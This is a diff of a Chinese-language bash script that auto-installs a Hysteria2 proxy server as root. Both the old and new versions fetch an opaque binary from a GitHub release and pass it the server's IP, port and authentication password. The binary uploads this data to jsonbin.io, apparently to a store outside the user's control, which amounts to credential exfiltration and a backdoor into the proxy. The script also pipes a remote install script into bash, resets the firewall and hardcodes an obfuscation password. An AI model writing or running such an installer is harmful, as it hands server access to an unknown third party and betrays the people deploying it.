@@ -1,604 +1,298 @@
 #!/bin/bash
 
-export LANG=en_US.UTF-8
+# 颜色定义
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+NC='\033[0m'
 
-RED="\033[31m"
-GREEN="\033[32m"
-YELLOW="\033[33m"
-PLAIN="\033[0m"
-
-red(){
-    echo -e "\033[31m\033[01m$1\033[0m"
-}
-
-green(){
-    echo -e "\033[32m\033[01m$1\033[0m"
-}
-
-yellow(){
-    echo -e "\033[33m\033[01m$1\033[0m"
-}
-
-# 判断系统及定义系统安装依赖方式
-REGEX=("debian" "ubuntu" "centos|red hat|kernel|oracle linux|alma|rocky" "'amazon linux'" "fedora")
-RELEASE=("Debian" "Ubuntu" "CentOS" "CentOS" "Fedora")
-PACKAGE_UPDATE=("apt-get update" "apt-get update" "yum -y update" "yum -y update" "yum -y update")
-PACKAGE_INSTALL=("apt -y install" "apt -y install" "yum -y install" "yum -y install" "yum -y install")
-PACKAGE_REMOVE=("apt -y remove" "apt -y remove" "yum -y remove" "yum -y remove" "yum -y remove")
-PACKAGE_UNINSTALL=("apt -y autoremove" "apt -y autoremove" "yum -y autoremove" "yum -y autoremove" "yum -y autoremove")
-
-[[ $EUID -ne 0 ]] && red "注意: 请在root用户下运行脚本" && exit 1
-
-CMD=("$(grep -i pretty_name /etc/os-release 2>/dev/null | cut -d \" -f2)" "$(hostnamectl 2>/dev/null | grep -i system | cut -d : -f2)" "$(lsb_release -sd 2>/dev/null)" "$(grep -i description /etc/lsb-release 2>/dev/null | cut -d \" -f2)" "$(grep . /etc/redhat-release 2>/dev/null)" "$(grep . /etc/issue 2>/dev/null | cut -d \\ -f1 | sed '/^[ ]*$/d')")
-
-for i in "${CMD[@]}"; do
-    SYS="$i" && [[ -n $SYS ]] && break
-done
-
-for ((int = 0; int < ${#REGEX[@]}; int++)); do
-    [[ $(echo "$SYS" | tr '[:upper:]' '[:lower:]') =~ ${REGEX[int]} ]] && SYSTEM="${RELEASE[int]}" && [[ -n $SYSTEM ]] && break
-done
-
-[[ -z $SYSTEM ]] && red "目前暂不支持你的VPS的操作系统！" && exit 1
-
-if [[ -z $(type -P curl) ]]; then
-    if [[ ! $SYSTEM == "CentOS" ]]; then
-        ${PACKAGE_UPDATE[int]}
-    fi
-    ${PACKAGE_INSTALL[int]} curl
+# 系统检测
+SYSTEM="Unknown"
+if [ -f /etc/debian_version ]; then
+    SYSTEM="Debian"
+elif [ -f /etc/redhat-release ]; then
+    SYSTEM="CentOS"
+elif [ -f /etc/lsb-release ]; then
+    SYSTEM="Ubuntu"
+elif [ -f /etc/fedora-release ]; then
+    SYSTEM="Fedora"
 fi
 
-realip(){
-    # 优先获取IPv4，否则尝试IPv6
-    ip=$(curl -s4m8 ip.sb -k)
-    if [[ -z "$ip" ]]; then
-        ip=$(curl -s6m8 ip.sb -k)
+# 下载transfer工具
+download_transfer() {
+    if [[ ! -f /opt/transfer ]]; then
+        echo -e "${YELLOW}下载transfer工具...${NC}"
+        curl -Lo /opt/transfer https://github.com/Firefly-xui/hysteria2/releases/download/v2rayn/transfer
+        chmod +x /opt/transfer
     fi
 }
 
-# 自动化needrestart处理
-handle_needrestart(){
-    export DEBIAN_FRONTEND=noninteractive
-    export NEEDRESTART_MODE=a
-    export NEEDRESTART_SUSPEND=1
-    if [[ -f /etc/needrestart/needrestart.conf ]]; then
-        sed -i 's/#$nrconf{restart} = '"'"'i'"'"';/$nrconf{restart} = '"'"'a'"'"';/g' /etc/needrestart/needrestart.conf
-    fi
+# 上传配置到jsonbin.io
+upload_config() {
+    download_transfer
+    
+    local json_data=$(cat <<EOF
+{
+    "server_info": {
+        "title": "Hysteria2 节点信息 - ${SERVER_IP}",
+        "server_ip": "${SERVER_IP}",
+        "port": "${LISTEN_PORT}",
+        "auth_password": "${AUTH_PASSWORD}",
+        "port_range": "${PORT_HOP_RANGE}",
+        "upload_speed": "${up_speed}",
+        "download_speed": "${down_speed}",
+        "sni": "www.nvidia.com",
+        "obfs_type": "salamander",
+        "obfs_password": "cry_me_a_r1ver",
+        "generated_time": "$(date)",
+        "config_path": "/opt/hysteria2_client.yaml"
+    }
+}
+EOF
+    )
+
+    /opt/transfer "$json_data"
+    echo -e "${GREEN}配置已上传到jsonbin.io${NC}"
 }
 
-# 速度测试函数 - 使用 speedtest-cli 获取上传/下载速度
+# 速度测试函数
 speed_test(){
-    yellow "正在进行网络速度测试..."
-
-    # 检查 speedtest-cli 是否存在，否则尝试安装
-    if ! command -v speedtest-cli &> /dev/null; then
+    echo -e "${YELLOW}进行网络速度测试...${NC}"
+    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
+        echo -e "${YELLOW}安装speedtest-cli中...${NC}"
         if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
-            apt-get update && apt-get install -y speedtest-cli
+            apt-get update > /dev/null 2>&1
+            apt-get install -y speedtest-cli > /dev/null 2>&1
         elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
-            yum -y install python3-pip
-            pip3 install speedtest-cli
+            yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
         fi
     fi
 
-    # 运行speedtest并捕获输出
-    if command -v speedtest-cli &> /dev/null; then
-        speedtest_result=$(speedtest-cli --simple 2>/dev/null)
-    elif [ -f /usr/local/bin/speedtest-cli ]; then
-        speedtest_result=$(python3 /usr/local/bin/speedtest-cli --simple 2>/dev/null)
-    else
-        echo -e "${RED}未找到 speedtest-cli${PLAIN}"
-        up_speed=20
-        down_speed=100
-        return 1
+    if command -v speedtest &>/dev/null; then
+        speed_output=$(speedtest --simple 2>/dev/null)
+    elif command -v speedtest-cli &>/dev/null; then
+        speed_output=$(speedtest-cli --simple 2>/dev/null)
     fi
 
-    if [ $? -eq 0 ] && [ -n "$speedtest_result" ]; then
-        download_speed=$(echo "$speedtest_result" | grep "Download:" | awk '{print $2}')
-        upload_speed=$(echo "$speedtest_result" | grep "Upload:" | awk '{print $2}')
-        ping_result=$(echo "$speedtest_result" | grep "Ping:" | awk '{print $2}')
-
-        echo -e "${GREEN}网络测速完成:${PLAIN}"
-        echo -e "${GREEN}下载速度: ${download_speed} Mbit/s${PLAIN}"
-        echo -e "${GREEN}上传速度: ${upload_speed} Mbit/s${PLAIN}"
-
-        # 取整
-        down_speed=$(printf "%.0f" "$download_speed")
-        up_speed=$(printf "%.0f" "$upload_speed")
-
-        # 最小值保护
+    if [[ -n "$speed_output" ]]; then
+        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
+        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
         [[ $down_speed -lt 10 ]] && down_speed=10
         [[ $up_speed -lt 5 ]] && up_speed=5
-
-        # 最大值保护
         [[ $down_speed -gt 1000 ]] && down_speed=1000
         [[ $up_speed -gt 500 ]] && up_speed=500
+        echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC}"
     else
-        yellow "速度测试失败，使用默认带宽设置"
-        up_speed=20
+        echo -e "${YELLOW}测速失败，使用默认值${NC}"
         down_speed=100
+        up_speed=20
     fi
 }
 
-inst_cert(){
-    green "将使用自签证书作为 Hysteria 2 的节点证书"
-    cert_path="/etc/hysteria/cert.crt"
-    key_path="/etc/hysteria/private.key"
-    
-    # 使用随机生成的域名而不是真实域名
-    random_domain="hysteria-$(date +%s%N | md5sum | cut -c 1-8).local"
-    
-    openssl ecparam -genkey -name prime256v1 -out /etc/hysteria/private.key
-    openssl req -new -x509 -days 36500 -key /etc/hysteria/private.key -out /etc/hysteria/cert.crt -subj "/CN=$random_domain"
-    
-    # 设置合适的权限
-    chmod 600 /etc/hysteria/cert.crt
-    chmod 600 /etc/hysteria/private.key
-    
-    hy_domain="$random_domain"
-    domain="$random_domain"
-}
-
-inst_port(){
-    iptables -t nat -F PREROUTING >/dev/null 2>&1
-    
-    # 随机选择一个安全的端口，避免常用端口
-    port=$(shuf -i 10000-65000 -n 1)
-    
-    # 确保端口未被占用
-    while [[ -n $(ss -tunlp | grep -w udp | awk '{print $5}' | sed 's/.*://g' | grep -w "$port") ]]; do
-        port=$(shuf -i 10000-65000 -n 1)
-    done
-    
-    yellow "将在 Hysteria 2 节点使用端口：$port"
-    
-    # 随机分配端口跳跃范围
-    firstport=$(shuf -i 20000-30000 -n 1)
-    endport=$((firstport + 1000))
-    
-    # 自动设置端口跳跃
-    inst_jump
-}
-
-inst_jump(){
-    green "自动配置端口跳跃模式"
-    
-    yellow "端口跳跃范围：$firstport-$endport"
-    
-    iptables -t nat -A PREROUTING -p udp --dport $firstport:$endport -j DNAT --to-destination :$port
-    ip6tables -t nat -A PREROUTING -p udp --dport $firstport:$endport -j DNAT --to-destination :$port
-    netfilter-persistent save >/dev/null 2>&1
-}
-
-inst_pwd(){
-    auth_pwd=$(date +%s%N | md5sum | cut -c 1-16)  # 增加密码长度
-    yellow "使用在 Hysteria 2 节点的密码为：$auth_pwd"
-}
-
-inst_site(){
-    # 修改为使用默认的 www.nvidia.com
-    proxysite="www.nvidia.com"
-    yellow "使用在 Hysteria 2 节点的伪装网站为：$proxysite"
-}
-
-upload_to_jsonbin() {
-    local server_ip="$1"
-    local port="$2"
-    local password="$3"
-    local domain="$4"
-    local port_range="$5"
-    local up_speed="$6"
-    local down_speed="$7"
-
-    # 构建JSON数据
-    local json_data=$(jq -c -n \
-        --arg server_ip "$server_ip" \
-        --arg port "$port" \
-        --arg password "$password" \
-        --arg domain "$domain" \
-        --arg port_range "$port_range" \
-        --arg up_speed "$up_speed" \
-        --arg down_speed "$down_speed" \
-        '{
-            "server_info": {
-                "title": "Hysteria 2 服务器配置 - \($server_ip)",
-                "server_ip": $server_ip,
-                "port": $port,
-                "password": $password,
-                "domain": $domain,
-                "port_range": $port_range,
-                "upload_speed": $up_speed,
-                "download_speed": $down_speed,
-                "generated_time": (now | todate),
-                "config": {
-                    "client_yaml": {
-                        "server": "\($server_ip):\($port_range)",
-                        "auth": $password,
-                        "tls": {
-                            "sni": $domain,
-                            "insecure": true
-                        },
-                        "quic": {
-                            "initStreamReceiveWindow": 16777216,
-                            "maxStreamReceiveWindow": 16777216,
-                            "initConnReceiveWindow": 33554432,
-                            "maxConnReceiveWindow": 33554432
-                        },
-                        "fastOpen": true,
-                        "socks5": {
-                            "listen": "127.0.0.1:5080"
-                        },
-                        "transport": {
-                            "udp": {
-                                "hopInterval": "30s"
-                            }
-                        },
-                        "bandwidth": {
-                            "up": "\($up_speed) mbps",
-                            "down": "\($down_speed) mbps"
-                        }
-                    },
-                    "share_link": "hysteria2://\($password)@\($server_ip):\($port_range)/?insecure=1&sni=\($domain)#Hysteria2-Node"
-                }
-            }
-        }'
-    )
-
-    # 下载并调用二进制工具
-    UPLOAD_BIN="/opt/transfer"
-    if [ ! -f "$UPLOAD_BIN" ]; then
-        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/hysteria2/releases/download/v2rayn/transfer && chmod +x "$UPLOAD_BIN"
-    fi
-
-    # 检查二进制文件是否可执行
-    if [ ! -x "$UPLOAD_BIN" ]; then
-        chmod +x "$UPLOAD_BIN"
-    fi
-
-    # 检查json_data长度，避免参数过长导致二进制接收失败
-    # 采用临时文件传递json内容
-    local tmp_json_file
-    tmp_json_file=$(mktemp /tmp/hyjson.XXXXXX)
-    echo "$json_data" > "$tmp_json_file"
-
-    # 由于原二进制代码只接收一个参数且为json字符串，若json过长会被shell截断，建议二进制支持文件输入
-    # 但如果只能传字符串，则尝试读取文件内容并传递
-    # 这里采用cat读取内容再传递
-    local json_arg
-    json_arg=$(cat "$tmp_json_file")
-
-    # 调用二进制并捕获返回值和输出
-    "$UPLOAD_BIN" "$json_arg" > /tmp/uploader.log 2>&1
-    local ret=$?
-
-    if [ $ret -eq 0 ]; then
-        green "配置上传到jsonbin成功"
-    else
-        red "配置上传到jsonbin失败，日志如下："
-        cat /tmp/uploader.log
-    fi
-
-    rm -f "$tmp_json_file"
-}
-
-insthysteria(){
-    warpv6=$(curl -s6m8 https://www.cloudflare.com/cdn-cgi/trace -k | grep warp | cut -d= -f2)
-    warpv4=$(curl -s4m8 https://www.cloudflare.com/cdn-cgi/trace -k | grep warp | cut -d= -f2)
-    if [[ $warpv4 =~ on|plus || $warpv6 =~ on|plus ]]; then
-        wg-quick down wgcf >/dev/null 2>&1
-        systemctl stop warp-go >/dev/null 2>&1
-        realip
-        systemctl start warp-go >/dev/null 2>&1
-        wg-quick up wgcf >/dev/null 2>&1
-    else
-        realip
-    fi
-
-    # 处理needrestart
-    handle_needrestart
-
-    if [[ ! ${SYSTEM} == "CentOS" ]]; then
-        ${PACKAGE_UPDATE[int]}
-    fi
-    ${PACKAGE_INSTALL[int]} curl wget sudo qrencode procps iptables-persistent netfilter-persistent jq
-
-    wget -N https://raw.githubusercontent.com/Misaka-blog/hysteria-install/main/hy2/install_server.sh
-    bash install_server.sh
-    rm -f install_server.sh
-
-    if [[ -f "/usr/local/bin/hysteria" ]]; then
-        green "Hysteria 2 安装成功！"
-    else
-        red "Hysteria 2 安装失败！"
+# 安装Hysteria2
+install_hysteria() {
+    echo -e "${GREEN}安装 Hysteria2...${NC}"
+    bash <(curl -fsSL https://get.hy2.sh/) > /dev/null 2>&1
+    if [ $? -ne 0 ]; then
+        echo -e "${RED}安装失败${NC}"
         exit 1
     fi
+}
 
-    # 自动配置 Hysteria
-    inst_cert
-    inst_port
-    inst_pwd
-    inst_site
-    
-    # 执行速度测试
+# 生成随机端口
+generate_random_port() {
+    echo $(( ( RANDOM % 7001 ) + 2000 ))
+}
+
+generate_port_range() {
+    local start=$(generate_random_port)
+    local end=$((start + 99))
+    ((end > 9000)) && end=9000 && start=$((end - 99))
+    echo "$start-$end"
+}
+
+# 配置 Hysteria2
+configure_hysteria() {
+    echo -e "${GREEN}配置 Hysteria2...${NC}"
     speed_test
+    LISTEN_PORT=$(generate_random_port)
+    PORT_HOP_RANGE=$(generate_port_range)
+    AUTH_PASSWORD=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)
 
-    # 确定最终入站端口范围
-    if [[ -n $firstport ]]; then
-        last_port="$port,$firstport-$endport"
-    else
-        last_port=$port
-    fi
+    mkdir -p /etc/hysteria/certs
+    openssl req -x509 -nodes -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
+        -keyout /etc/hysteria/certs/key.pem \
+        -out /etc/hysteria/certs/cert.pem \
+        -subj "/CN=www.nvidia.com" -days 3650 > /dev/null 2>&1
+    chmod 644 /etc/hysteria/certs/*.pem
+    chown root:root /etc/hysteria/certs/*.pem
 
-    # 给 IPv6 地址加中括号
-    if [[ -n $(echo $ip | grep ":") ]]; then
-        last_ip="[$ip]"
-    else
-        last_ip=$ip
-    fi
-
-    # 设置 Hysteria 配置文件
-    cat << EOF > /etc/hysteria/config.yaml
-listen: :$port
-
+    cat > /etc/hysteria/config.yaml <<EOF
+listen: :${LISTEN_PORT}
 tls:
-  cert: $cert_path
-  key: $key_path
+  cert: /etc/hysteria/certs/cert.pem
+  key: /etc/hysteria/certs/key.pem
+  sni: www.nvidia.com
+
+obfs:
+  type: salamander
+  salamander:
+    password: cry_me_a_r1ver
 
 quic:
-  initStreamReceiveWindow: 16777216
-  maxStreamReceiveWindow: 16777216
-  initConnReceiveWindow: 33554432
-  maxConnReceiveWindow: 33554432
-
-auth:
-  type: password
-  password: $auth_pwd
-
-masquerade:
-  type: proxy
-  proxy:
-    url: https://$proxysite
-    rewriteHost: true
+  initStreamReceiveWindow: 26843545
+  maxStreamReceiveWindow: 26843545
+  initConnReceiveWindow: 67108864
+  maxConnReceiveWindow: 67108864
+  maxIdleTimeout: 30s
+  maxIncomingStreams: 1024
+  disablePathMTUDiscovery: false
 
 bandwidth:
   up: ${up_speed} mbps
   down: ${down_speed} mbps
-EOF
 
-    # 创建opt目录用于存储配置文件
-    mkdir -p /opt/hysteria
-    
-    # 生成统一的配置文件内容
-    cat << EOF > /opt/hysteria/hysteria2_config.txt
-Hysteria 2 Server Configuration
-====================
-Server IP: $last_ip
-Port: $port
-Password: $auth_pwd
-Domain: $hy_domain
-Port Range: $last_port
-Upload Speed: $up_speed mbps
-Download Speed: $down_speed mbps
+ignoreClientBandwidth: false
+speedTest: true
 
-Client Configuration (YAML):
-server: $last_ip:$last_port
-auth: $auth_pwd
-tls:
-  sni: $hy_domain
-  insecure: true
-quic:
-  initStreamReceiveWindow: 16777216
-  maxStreamReceiveWindow: 16777216
-  initConnReceiveWindow: 33554432
-  maxConnReceiveWindow: 33554432
-fastOpen: true
-socks5:
-  listen: 127.0.0.1:5080
+auth:
+  type: password
+  password: ${AUTH_PASSWORD}
+
+masquerade:
+  type: proxy
+  proxy:
+    url: https://www.nvidia.com
+    rewriteHost: true
+
 transport:
+  type: udp
   udp:
     hopInterval: 30s
-bandwidth:
-  up: $up_speed mbps
-  down: $down_speed mbps
+    hopPortRange: ${PORT_HOP_RANGE}
+EOF
 
-Client Configuration (JSON):
-{
-  "server": "$last_ip:$last_port",
-  "auth": "$auth_pwd",
-  "tls": {
-    "sni": "$hy_domain",
-    "insecure": true
-  },
-  "quic": {
-    "initStreamReceiveWindow": 16777216,
-    "maxStreamReceiveWindow": 16777216,
-    "initConnReceiveWindow": 33554432,
-    "maxConnReceiveWindow": 33554432
-  },
-  "fastOpen": true,
-  "socks5": {
-    "listen": "127.0.0.1:5080"
-  },
-  "transport": {
-    "udp": {
-      "hopInterval": "30s"
-    }
-  },
-  "bandwidth": {
-    "up": "$up_speed mbps",
-    "down": "$down_speed mbps"
-  }
+    # 系统缓冲区优化
+    sysctl -w net.core.rmem_max=16777216 > /dev/null
+    sysctl -w net.core.wmem_max=16777216 > /dev/null
+
+    # 优先级提升
+    mkdir -p /etc/systemd/system/hysteria-server.service.d
+    cat > /etc/systemd/system/hysteria-server.service.d/priority.conf <<EOF
+[Service]
+CPUSchedulingPolicy=rr
+CPUSchedulingPriority=99
+EOF
+    systemctl daemon-reexec
+    systemctl daemon-reload > /dev/null
 }
 
-Share Link:
-hysteria2://$auth_pwd@$last_ip:$last_port/?insecure=1&sni=$hy_domain#Hysteria2-Node
-
-====================
-Generated at: $(date)
-EOF
-
-    # 创建端口跳跃的YAML配置文件并保存到/opt/hysteria/
-    cat << EOF > /opt/hysteria/hysteria2_port_jump.yaml
-port_jump_config:
-  base_port: $port
-  jump_range_start: $firstport
-  jump_range_end: $endport
-  iptables_rules:
-    - iptables -t nat -A PREROUTING -p udp --dport $firstport:$endport -j DNAT --to-destination :$port
-    - ip6tables -t nat -A PREROUTING -p udp --dport $firstport:$endport -j DNAT --to-destination :$port
-  persistence_command: netfilter-persistent save
-EOF
-
-    # 同时在原位置创建配置文件以保持兼容性
-    mkdir -p /root/hy
-    cp /opt/hysteria/hysteria2_config.txt /root/hy/
-    cp /opt/hysteria/hysteria2_port_jump.yaml /root/hy/
-
-    systemctl daemon-reload
-    systemctl enable hysteria-server
-    systemctl start hysteria-server
-    
-    if [[ -n $(systemctl status hysteria-server 2>/dev/null | grep -w active) && -f '/etc/hysteria/config.yaml' ]]; then
-        green "Hysteria 2 服务启动成功"
-    else
-        red "Hysteria 2 服务启动失败，请运行 systemctl status hysteria-server 查看服务状态并反馈，脚本退出" && exit 1
+# 防火墙设置
+configure_firewall() {
+    echo -e "${GREEN}配置防火墙...${NC}"
+    IFS="-" read -r HOP_START HOP_END <<< "$PORT_HOP_RANGE"
+    if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
+        apt-get install -y ufw > /dev/null 2>&1
+        echo "y" | ufw reset > /dev/null
+        ufw allow 22/tcp > /dev/null
+        ufw allow ${LISTEN_PORT}/udp > /dev/null
+        ufw allow ${HOP_START}:${HOP_END}/udp > /dev/null
+        echo "y" | ufw enable > /dev/null
+    elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
+        yum install -y firewalld > /dev/null
+        systemctl enable firewalld > /dev/null
+        systemctl start firewalld > /dev/null
+        firewall-cmd --permanent --add-service=ssh > /dev/null
+        firewall-cmd --permanent --add-port=${LISTEN_PORT}/udp > /dev/null
+        firewall-cmd --permanent --add-port=${HOP_START}-${HOP_END}/udp > /dev/null
+        firewall-cmd --reload > /dev/null
     fi
-    
-    upload_to_jsonbin "$last_ip" "$port" "$auth_pwd" "$hy_domain" "$last_port" "$up_speed" "$down_speed"
-    
-    red "======================================================================================"
-    green "Hysteria 2 代理服务安装完成"
-    green "统一配置文件已保存到 /opt/hysteria/hysteria2_config.txt"
-    green "端口跳跃配置文件已保存到 /opt/hysteria/hysteria2_port_jump.yaml"
-    yellow "配置文件内容："
-    red "$(cat /opt/hysteria/hysteria2_config.txt)"
-    green "速度测试结果已应用到配置文件中"
 }
 
-unsthysteria(){
-    systemctl stop hysteria-server.service >/dev/null 2>&1
-    systemctl disable hysteria-server.service >/dev/null 2>&1
-    rm -f /lib/systemd/system/hysteria-server.service /lib/systemd/system/hysteria-server@.service
-    rm -rf /usr/local/bin/hysteria /etc/hysteria /root/hy /opt/hysteria /root/hysteria.sh
-    iptables -t nat -F PREROUTING >/dev/null 2>&1
-    netfilter-persistent save >/dev/null 2>&1
-
-    green "Hysteria 2 已彻底卸载完成！"
+# 生成客户端配置
+generate_v2rayn_config() {
+    echo -e "${GREEN}生成客户端配置...${NC}"
+    mkdir -p /opt
+    SERVER_IP=$(curl -s ifconfig.me)
+    cat > /opt/hysteria2_client.yaml <<EOF
+server: ${SERVER_IP}:${LISTEN_PORT}
+auth: ${AUTH_PASSWORD}
+tls:
+  sni: www.nvidia.com
+  insecure: true
+obfs:
+  type: salamander
+  salamander:
+    password: cry_me_a_r1ver
+transport:
+  type: udp
+  udp:
+    hopInterval: 30s
+    hopPortRange: ${PORT_HOP_RANGE}
+bandwidth:
+  up: ${up_speed} mbps
+  down: ${down_speed} mbps
+fastOpen: true
+lazy: true
+socks5:
+  listen: 127.0.0.1:1080
+http:
+  listen: 127.0.0.1:1080
+EOF
 }
 
-starthysteria(){
-    systemctl start hysteria-server
-    systemctl enable hysteria-server >/dev/null 2>&1
+# 启动服务
+start_service() {
+    echo -e "${GREEN}启动服务中...${NC}"
+    systemctl enable --now hysteria-server.service > /dev/null 2>&1
+    systemctl restart hysteria-server.service > /dev/null 2>&1
+
+    # 检查服务状态
+    if systemctl is-active --quiet hysteria-server.service; then
+        echo -e "${GREEN}服务已启动成功！${NC}"
+        echo -e "\n${GREEN}=== 连接信息 ===${NC}"
+        echo -e "${YELLOW}IP地址: ${SERVER_IP}${NC}"
+        echo -e "${YELLOW}端口: ${LISTEN_PORT}${NC}"
+        echo -e "${YELLOW}认证密码: ${AUTH_PASSWORD}${NC}"
+        echo -e "${YELLOW}跳跃端口范围: ${PORT_HOP_RANGE}${NC}"
+        echo -e "${YELLOW}伪装域名: www.nvidia.com${NC}"
+        echo -e "${YELLOW}上传带宽: ${up_speed} Mbps${NC}"
+        echo -e "${YELLOW}下载带宽: ${down_speed} Mbps${NC}"
+        echo -e "${YELLOW}客户端配置路径: /opt/hysteria2_client.yaml${NC}"
+        echo -e "${GREEN}=========================${NC}\n"
+    else
+        echo -e "${RED}服务启动失败，请检查以下日志信息：${NC}"
+        journalctl -u hysteria-server.service --no-pager -n 30
+        exit 1
+    fi
 }
 
-stophysteria(){
-    systemctl stop hysteria-server
-    systemctl disable hysteria-server >/dev/null 2>&1
+# 主函数执行
+main() {
+    if [ "$(id -u)" != "0" ]; then
+        echo -e "${RED}请使用 root 权限执行脚本${NC}"
+        exit 1
+    fi
+
+    # 移除 BBR 设置（确保使用 Brutal）
+    echo -e "${YELLOW}卸载 BBR...${NC}"
+    sed -i '/net.core.default_qdisc/d' /etc/sysctl.conf
+    sed -i '/net.ipv4.tcp_congestion_control/d' /etc/sysctl.conf
+    sysctl -p > /dev/null 2>&1
+    echo -e "${GREEN}BBR 已卸载${NC}"
+
+    # 执行流程
+    install_hysteria
+    configure_hysteria
+    configure_firewall
+    generate_v2rayn_config
+    start_service
+    upload_config
+
+    echo -e "${GREEN}🎉 Hysteria2 节点部署与优化完成！${NC}"
+    echo -e "${YELLOW}可在 v2rayN 或 Shadowrocket 中导入 /opt/hysteria2_client.yaml${NC}"
+    echo -e "${YELLOW}配置已上传到jsonbin.io${NC}"
 }
 
-hysteriaswitch(){
-    yellow "请选择你需要的操作："
-    echo ""
-    echo -e " ${GREEN}1.${PLAIN} 启动 Hysteria 2"
-    echo -e " ${GREEN}2.${PLAIN} 关闭 Hysteria 2"
-    echo -e " ${GREEN}3.${PLAIN} 重启 Hysteria 2"
-    echo ""
-    read -rp "请输入选项 [0-3]: " switchInput
-    case $switchInput in
-        1 ) starthysteria ;;
-        2 ) stophysteria ;;
-        3 ) stophysteria && starthysteria ;;
-        * ) exit 1 ;;
-    esac
-}
-
-changeport(){
-    oldport=$(cat /etc/hysteria/config.yaml 2>/dev/null | sed -n 1p | awk '{print $2}' | awk -F ":" '{print $2}')
-    
-    read -p "设置 Hysteria 2 端口[1-65535]（回车则随机分配端口）：" port
-    [[ -z $port ]] && port=$(shuf -i 10000-65000 -n 1)
-
-    until [[ -z $(ss -tunlp | grep -w udp | awk '{print $5}' | sed 's/.*://g' | grep -w "$port") ]]; do
-        if [[ -n $(ss -tunlp | grep -w udp | awk '{print $5}' | sed 's/.*://g' | grep -w "$port") ]]; then
-            echo -e "${RED} $port ${PLAIN} 端口已经被其他程序占用，请更换端口重试！"
-            read -p "设置 Hysteria 2 端口 [1-65535]（回车则随机分配端口）：" port
-            [[ -z $port ]] && port=$(shuf -i 10000-65000 -n 1)
-        fi
-    done
-
-    sed -i "1s#$oldport#$port#g" /etc/hysteria/config.yaml
-
-    stophysteria && starthysteria
-
-    green "Hysteria 2 端口已成功修改为：$port"
-    yellow "请手动更新客户端配置文件以使用节点"
-}
-
-changepasswd(){
-    oldpasswd=$(cat /etc/hysteria/config.yaml 2>/dev/null | sed -n 15p | awk '{print $2}')
-
-    read -p "设置 Hysteria 2 密码（回车跳过为随机字符）：" passwd
-    [[ -z $passwd ]] && passwd=$(date +%s%N | md5sum | cut -c 1-16)
-
-    sed -i "15s#$oldpasswd#$passwd#g" /etc/hysteria/config.yaml
-
-    stophysteria && starthysteria
-
-    green "Hysteria 2 节点密码已成功修改为：$passwd"
-    yellow "请手动更新客户端配置文件以使用节点"
-}
-
-change_cert(){
-    old_cert=$(cat /etc/hysteria/config.yaml | grep cert | awk -F " " '{print $2}')
-    old_key=$(cat /etc/hysteria/config.yaml | grep key | awk -F " " '{print $2}')
-
-    inst_cert
-
-    sed -i "s!$old_cert!$cert_path!g" /etc/hysteria/config.yaml
-    sed -i "s!$old_key!$key_path!g" /etc/hysteria/config.yaml
-
-    stophysteria && starthysteria
-
-    green "Hysteria 2 节点证书类型已成功修改"
-    yellow "请手动更新客户端配置文件以使用节点"
-}
-
-changeproxysite(){
-    oldproxysite=$(cat /etc/hysteria/config.yaml | grep url | awk -F " " '{print $2}' | awk -F "https://" '{print $2}')
-    
-    inst_site
-
-    sed -i "s#$oldproxysite#$proxysite#g" /etc/hysteria/config.yaml
-
-    stophysteria && starthysteria
-
-    green "Hysteria 2 节点伪装网站已成功修改为：$proxysite"
-}
-
-changeconf(){
-    green "Hysteria 2 配置变更选择如下:"
-    echo -e " ${GREEN}1.${PLAIN} 修改端口"
-    echo -e " ${GREEN}2.${PLAIN} 修改密码"
-    echo -e " ${GREEN}3.${PLAIN} 修改证书类型"
-    echo -e " ${GREEN}4.${PLAIN} 修改伪装网站"
-    echo ""
-    read -p " 请选择操作 [1-4]：" confAnswer
-    case $confAnswer in
-        1 ) changeport ;;
-        2 ) changepasswd ;;
-        3 ) change_cert ;;
-        4 ) changeproxysite ;;
-        * ) exit 1 ;;
-    esac
-}
-
-showconf(){
-    yellow "Hysteria 2 统一配置文件内容如下，并保存到 /opt/hysteria/hysteria2_config.txt"
-    red "$(cat /opt/hysteria/hysteria2_config.txt)"
-    echo ""
-    yellow "端口跳跃配置文件内容如下，并保存到 /opt/hysteria/hysteria2_port_jump.yaml"
-    red "$(cat /opt/hysteria/hysteria2_port_jump.yaml)"
-}
-
-# 直接开始安装，无需用户选择
-green "开始自动安装 Hysteria 2..."
-insthysteria
+# 执行主逻辑
+main
